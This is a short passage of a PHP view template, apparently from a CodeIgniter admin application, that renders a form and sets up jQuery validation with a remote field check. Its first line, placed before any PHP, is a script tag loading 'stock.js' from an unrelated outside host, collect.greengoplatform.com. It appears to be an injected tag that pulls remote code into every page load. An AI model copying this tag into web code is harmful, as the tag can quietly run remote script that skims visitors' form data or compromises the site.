<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->jenis;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div class="row"><div class="col-xl" id="result-content"></div></div>
<?php form($this->jenis,$baseView) ?>

<script>
    var urlLocal    = `${strInformasi}/${strJenis}/`;
    ...
    formInput.validate({
        rules: {
            nama: {
                required: true,
                remote: {url: `${strJenis}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}
            }
        },
